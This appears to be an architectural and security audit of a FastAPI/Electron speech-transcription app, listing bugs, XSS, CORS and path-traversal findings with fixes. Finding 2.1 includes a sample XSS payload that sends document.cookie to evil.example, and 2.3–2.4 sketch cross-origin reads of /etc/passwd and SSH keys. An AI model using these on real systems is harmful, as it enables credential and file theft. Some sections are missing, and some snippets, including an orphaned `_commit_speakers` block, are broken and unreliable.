# Audit — June 2026

Full architectural audit of the whisper_project codebase conducted 2026-06-02. Covers the FastAPI backend (`app/`), Electron frontend (`electron/`), services layer, database, and CSS. Each finding includes file:line, severity, root cause, and a concrete fix plan.

Use this document as an execution checklist. Mark each item `✅` when the fix is merged to `main`.

## Severity legend

| Label | Meaning |
|---|---|
| **Critical** | Data loss, security exploit, invariant broken in production |
| **High** | Incorrect behaviour visible to users, or security risk requiring specific setup |
| **Medium** | Latent bug, UX breakage under non-trivial conditions, notable performance hit |
| **Low** | Clutter, minor inefficiency, future maintainability concern |

## Section 1 — Bugs & Correctness

### 1.1 Reassign-by-name silently loses the new speaker when no embeddings exist

**Severity:** High  
**File:** `app/api/routers/transcripts.py:211–224`

**Root cause:**  
When `POST /transcribe/{id}/reassign` creates a new speaker by name it calls:

```python
memory.set_name(to_uuid, body.to_speaker_name)
commit_svc.commit_speaker(to_uuid).save()
```

`commit_speaker` calls `_avg_from_db(to_uuid)` to compute a centroid from DB segments. If no segments carry a valid embedding (new recording with bad audio, or diarization produced no segment for this UUID), `_avg_from_db` returns `None`, `update_embedding` is never called, and `to_uuid` is never inserted into `memory.known_speakers`.

`SpeakerMemoryService.save()` at line 308 filters:

```python
speakers_with_names = [s for s in self.known_names if s in self.known_speakers]
```

So the name set by `set_name` is also silently dropped. After server restart, the speaker has no row in `speaker_embeddings` and no row in `speaker_names`. The reassign appears to succeed (200 response) but the speaker identity is lost.

**Fix:**  
After `memory.set_name(to_uuid, body.to_speaker_name)`, explicitly persist the name regardless of whether an embedding exists:

```python
memory.set_name(to_uuid, body.to_speaker_name)
memory.save_names_only()          # ← add this
commit_svc.commit_speaker(to_uuid)  # this additionally writes embedding if available
```

Alternatively, change `save()` to also flush names for speakers in `known_names` even if they have no known embedding yet (a "name-only" speaker row).

**Test to add:** `test_reassign_creates_speaker_with_no_embeddings_persists_name` — assert that after reassign + server reload, the new speaker's name is retrievable.

### 1.2 I3 violation — reassign precondition uses `speaker_resolved` only

**Severity:** Medium (latent)  
**File:** `app/api/routers/transcripts.py:204`

**Root cause:**  
The guard:

```python
if not any(seg.speaker_resolved == body.from_speaker_id for seg in t.segments):
    raise HTTPException(404, ...)
```

violates invariant I3 (`speaker_final > speaker_resolved > speaker_raw`). A segment whose assignment was corrected by the user has `speaker_final` set and `speaker_resolved` still pointing to the original speaker. The precondition wrongly rejects the reassign.

Currently masked: `TranscriptStorageService.load()` collapses `speaker_final` into `speaker_resolved` on load (line 137 of `transcript_storage_service.py`), so `speaker_final` is always `None` for loaded segments. If that collapse is ever removed this becomes a live bug.

**Fix:**

```python
def _effective(seg):
    return seg.speaker_final or seg.speaker_resolved or seg.speaker_raw

if not any(_effective(seg) == body.from_speaker_id for seg in t.segments):
    raise HTTPException(404, ...)
```

Apply the same helper to the reassign loop at line 217.

### 1.4 Escape-key listener in New Recording modal leaks on every open

**Severity:** Medium  
**File:** `electron/renderer/views/new-recording-modal.js:27–29`

**Root cause:**

```js
document.addEventListener('keydown', function onEsc(e) {
  if (e.key === 'Escape') {
    close();
    document.removeEventListener('keydown', onEsc);
  }
});
```

The listener is only removed when the user presses Escape. Closing via the ✕ button, the backdrop, or the Import/Start buttons never removes it. After 10 opens there are 10 stale listeners. The 11th `Escape` press fires them all; each calls `close()` on its own closure's `overlay` reference. For the current modal this means `remove()` is called multiple times (harmless after first) but `closeModal` side-effects (hiding backdrop, re-enabling body scroll, etc.) run repeatedly.

**Fix:**

```js
function close() {
  document.removeEventListener('keydown', onEsc);   // ← add
  overlay.remove();
  // ... rest of close logic
}

function onEsc(e) {
  if (e.key === 'Escape') close();
}

document.addEventListener('keydown', onEsc);
```

### 1.5 `fetch()` chains in `editor-view.js` have no `.catch()`

**Severity:** Medium  
**File:** `electron/renderer/views/editor-view.js` — lines 130, 208, 422, 458, 591, 1294

**Root cause:**  
All critical user-action fetches (speaker picker reassign, `assignSpeaker`, delete segment, commit edit, confirm suggestion, and full `reload()`) are fire-and-forget on failure. A 5xx from the server silently leaves the UI in an inconsistent state: the popup stays open, the delete spinner never stops, the toolbar remains disabled.

**Fix for each site:**

```js
.fetch(url, opts)
.then(r => { if (!r.ok) throw new Error(r.statusText); return r.json(); })
.then(data => { /* success path */ })
.catch(err => window.showToast(`Error: ${err.message}`, 'error'))
.finally(() => { /* restore UI state: re-enable buttons, close spinner */ });
```

Exact locations:

| Line | Action |
|---|---|
| 130 | Speaker picker reassign |
| 208 | `assignSpeaker` single-segment update |
| 422 | Delete segment button |
| 458 | Commit inline edit |
| 591 | Confirm speaker suggestion |
| 1294 | Full editor `reload()` |

### 1.6 O(N²) `displayName()` inside segment render loop

**Severity:** Medium  
**File:** `electron/renderer/views/editor-view.js:1280–1291` called from loop at line 1369

**Root cause:**  
`displayName(spkId)` computes `firstSeen` and `unrecognizedIds` by iterating **all** `transcript.segments` each call. The function is called once per segment row inside `buildEditor`'s `forEach`, producing O(N²) iterations. A 1 000-segment transcript = ~1 M iterations on every editor open and after every reload.

**Fix:**  
Pre-compute once before the loop:

```js
// Before the forEach:
const { firstSeen, unrecognizedIds } = buildSpeakerIndex(transcript.segments, knownMap);

// Inside the forEach, pass pre-built index:
const label = displayName(spkId, knownMap, firstSeen, unrecognizedIds);
```

Extract `buildSpeakerIndex` as a named helper (it is also needed in `makeRightPanel` — see duplicate at line 1026–1036, which is the same algorithm written twice).

### 1.7 `_jobs` / `_download_jobs` queues leak if WebSocket never connects

**Severity:** Medium  
**File:** `app/api/routers/transcription.py:30–72`; `app/api/routers/models.py:62`

**Root cause:**  
`start_transcribe` inserts an `asyncio.Queue` into `_jobs[job_id]`. The queue is removed only inside `ws_progress`'s `finally` block (line 168). If the renderer crashes, the user navigates away, or the WS connection is never opened, the entry lives forever. On a long-running server with many jobs this accumulates unbounded memory.

**Fix:**  
Remove the entry in the worker thread's own `finally` block after emitting the terminal event (`done`, `error`, `cancelled`), rather than relying on the WS handler:

```python
async def _run(job_id, ...):
    try:
        ...
    finally:
        # drain and remove so the entry doesn't leak if WS never connects
        _jobs.pop(job_id, None)
        _cancel_events.pop(job_id, None)
```

Apply the same pattern to `models.py`.

### 1.8 `audio_path` not validated before scheduling the job

**Severity:** Medium  
**File:** `app/api/routers/transcription.py:96`

**Root cause:**  
A nonexistent or unreadable path is discovered only inside the worker thread, producing a generic exception that becomes an opaque `error` event on the WebSocket. The user sees "Transcription failed" with no actionable message.

**Fix:**  
Add a 400-level check before accepting the job:

```python
import os

@router.post("/transcribe")
async def start_transcribe(body: TranscribeRequest, ...):
    if not os.path.isfile(body.audio_path):
        raise HTTPException(400, f"audio_path not found: {body.audio_path}")
    if not os.access(body.audio_path, os.R_OK):
        raise HTTPException(400, f"audio_path not readable: {body.audio_path}")
    ...
```

### 1.9 `commit_recognized_speakers` lacks the similarity guard used by `commit_speaker`

**Severity:** Low  
**File:** `app/services/commit_service.py:110–127`

**Root cause:**  
`commit_speaker` passes `guard_emb=memory.known_speakers.get(spk_id)` to `_avg_from_db`, which discards per-transcript centroids whose similarity to the current stored embedding is below `memory.threshold`. This prevents one bad-audio session from dragging the embedding away from its historical average.

`commit_recognized_speakers` calls `_avg_from_db(spk_id)` without `guard_emb`, so every recognized speaker is re-averaged without this protection after a full transcript commit.

**Fix:**

```python
guard = memory.known_speakers.get(spk_id)
new_emb = self._avg_from_db(spk_id, guard_emb=guard)
```

## Section 2 — Security

### 2.1 XSS via speaker display name injected with `innerHTML`

**Severity:** High  
**File:** `electron/renderer/views/editor-view.js:577`

**Root cause:**

```js
txt.innerHTML = `Likely <span class="spk-suggestion-name" style="color:${p.color}">
  ${suggestion.name}
</span>...`;
```

`suggestion.name` is a user-controlled display name returned verbatim from `GET /transcripts/{id}/speaker-suggestions`. A user can rename any speaker to `<img src=x onerror="fetch('http://evil.example/'+document.cookie)">` via `POST /speakers/{id}/rename` — that script then executes when the suggestion card renders. Electron's `contextIsolation` protects the main process, but the renderer has full DOM access and can reach `electronAPI` through the exposed bridge.

**Fix:**  
Replace the template-string `innerHTML` with DOM construction:

```js
const nameSpan = document.createElement('span');
nameSpan.className = 'spk-suggestion-name';
nameSpan.style.color = p.color;
nameSpan.textContent = suggestion.name;   // ← textContent, not innerHTML
txt.appendChild(document.createTextNode('Likely '));
txt.appendChild(nameSpan);
```

Audit all other `innerHTML` assignments for user-controlled data (check `editor-view.js` lines 1132, 1164 — currently safe since `title`/`text` originate from transcription, not user rename, but note the risk).

### 2.2 `RenameRequest.name` has no length or character constraints

**Severity:** Medium  
**File:** `app/api/schemas.py:47–49`; used at `app/api/routers/speakers.py:19–28`

**Root cause:**  
`name: str` accepts any string. A caller can send a multi-MB payload (resource exhaustion) or inject HTML markup (vector for 2.1 even after the `innerHTML` fix is reverted).

**Fix:**

```python
from pydantic import Field

class RenameRequest(BaseModel):
    name: str = Field(min_length=1, max_length=128)
```

Add a strip of leading/trailing whitespace:

```python
@validator('name')
def strip_name(cls, v):
    return v.strip()
```

### 2.3 CORS `allow_origins=["*"]` exposes the API to any web page

**Severity:** High (if the server is reachable from a browser, which it is on localhost)  
**File:** `app/api/main.py:33–36`

**Root cause:**  
The current policy:

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)
```

Any website the user visits can `fetch("http://localhost:8000/transcribe", { body: JSON.stringify({ audio_path: "/etc/passwd" }) })` and read the response. Combined with 2.4, this enables arbitrary local file exfiltration.

The existing comment acknowledges this is unsafe before distribution; the fix should happen before any public release, but ideally sooner.

**Fix:**  
Restrict origins to `null` (Electron `file://`) and `http://127.0.0.1` only:

```python
allow_origins=["null", "http://127.0.0.1", "http://localhost"],
```

Additionally, bind the server to `127.0.0.1` only so it is unreachable from other machines on the local network:

```bash
uvicorn app.api.main:app --port 8000 --host 127.0.0.1
```

### 2.4 `audio_path` accepted without workspace whitelist — path traversal

**Severity:** Medium (High when combined with 2.3)  
**File:** `app/api/routers/transcription.py:96` → `transcription_service.transcribe(audio_path)`

**Root cause:**  
`audio_path` is taken directly from the API request body and passed to `whisperx.load_audio()`. No check is made that the path is inside an expected workspace. A malicious cross-origin request can submit `/home/user/.ssh/id_rsa` or any file readable by the server process.

**Fix (defence-in-depth):**

1. After fixing 2.3 (CORS restriction), cross-origin callers can no longer reach the endpoint.
2. Additionally, validate that `audio_path` resolves inside an allowed root:

```python
ALLOWED_ROOTS = [Path.home(), Path(tempfile.gettempdir())]

def _check_path(p: str):
    resolved = Path(p).resolve()
    if not any(resolved.is_relative_to(root) for root in ALLOWED_ROOTS):
        raise HTTPException(400, "audio_path outside allowed workspace")
```

### 2.5 `save-recording` IPC accepts caller-controlled file extension

**Severity:** Low  
**File:** `electron/main.js:73–78`

**Root cause:**

```js
const filePath = path.join(os.tmpdir(), `whisper-rec-${crypto.randomUUID()}.${ext}`);
```

`ext` comes from the renderer without validation. A compromised renderer could supply `ext = "wav/../../sensitive"`. `path.join` normalises slashes but a value like `"wav"` is expected; no whitelist is applied.

**Fix:**

```js
const ALLOWED_EXT = new Set(['webm', 'wav', 'ogg', 'mp4']);
const safeExt = ALLOWED_EXT.has(ext) ? ext : 'webm';
const filePath = path.join(os.tmpdir(), `whisper-rec-${crypto.randomUUID()}.${safeExt}`);
```

### 2.6 `write-settings` IPC has no schema validation or size limit

**Severity:** Low  
**File:** `electron/main.js:57–59`

**Root cause:**  
The IPC handler writes whatever the renderer sends to the settings file with no validation. A multi-MB object would block the synchronous `writeFileSync` on the main process thread.

**Fix:**  
Validate the payload against the expected settings schema (keys: `theme`, `language`, `model`, etc.) and cap total JSON size:

```js
const MAX_SETTINGS_BYTES = 64 * 1024;
ipcMain.handle('write-settings', (_, data) => {
  const json = JSON.stringify(data);
  if (json.length > MAX_SETTINGS_BYTES) throw new Error('settings payload too large');
  // validate keys ...
  fs.writeFileSync(settingsPath, json);
});
```

```python
def _commit_speakers(self, transcript, predicate):
    for spk_id in {_effective(s) for s in transcript.segments if predicate(spk_id)}:
        avg = self._avg_from_db(spk_id, guard_emb=self.memory.known_speakers.get(spk_id))
        if avg is not None:
            self.memory.update_embedding(spk_id, avg)
    return self
```

### 6.2 `timeupdate` handler does `querySelectorAll('.seg-row')` on every frame

**Severity:** Medium  
**File:** `electron/renderer/views/editor-view.js:1378–1385`

**Root cause:**  
The HTML5 audio element fires `timeupdate` several times per second. The handler:

```js
audio.addEventListener('timeupdate', () => {
  const rows = editorEl.querySelectorAll('.seg-row');
  rows.forEach(row => {
    const start = parseFloat(row.dataset.start);
    const end   = parseFloat(row.dataset.end);
    row.classList.toggle('seg-row--playing', currentTime >= start && currentTime < end);
  });
});
```

walks and mutates every DOM row multiple times per second. For a 1 000-row transcript this is thousands of `classList.toggle` calls per second.

**Fix:**  
Build a sorted index once after `buildEditor`:

```js
const segIndex = transcript.segments.map((seg, i) => ({
  start: seg.start, end: seg.end,
  row: editorEl.querySelectorAll('.seg-row')[i]
})).sort((a, b) => a.start - b.start);

let lastActive = -1;
audio.addEventListener('timeupdate', () => {
  const t = audio.currentTime;
  // binary search for the active segment
  let lo = 0, hi = segIndex.length - 1, active = -1;
  while (lo <= hi) {
    const mid = (lo + hi) >> 1;
    if (segIndex[mid].end <= t) lo = mid + 1;
    else if (segIndex[mid].start > t) hi = mid - 1;
    else { active = mid; break; }
  }
  if (active !== lastActive) {
    if (lastActive >= 0) segIndex[lastActive].row.classList.remove('seg-row--playing');
    if (active >= 0) segIndex[active].row.classList.add('seg-row--playing');
    lastActive = active;
  }
});
```

### 6.4 Full transcript re-fetch after every speaker action
